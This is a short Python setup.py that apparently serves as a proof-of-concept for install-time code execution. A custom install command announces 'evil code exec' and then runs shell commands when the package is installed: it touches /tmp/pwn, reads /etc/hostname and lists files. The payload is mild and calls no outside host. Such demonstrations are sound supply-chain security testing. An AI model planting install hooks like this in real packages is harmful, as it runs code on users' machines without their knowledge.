from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess



class CustomInstallCommand(install):
    def run(self):
        print("evil code exec while building package")
        print(subprocess.check_output(["touch", "/tmp/pwn"]))
        print(subprocess.check_output(["cat", "/etc/hostname"]))
        print(subprocess.check_output(["ls", "-al"]))        
        install.run(self)
setup(
    name='package_346234294',
    version='0.1',
    packages=find_packages(),
    install_requires=[
    ],
    cmdclass={
        'install': CustomInstallCommand
    }
)
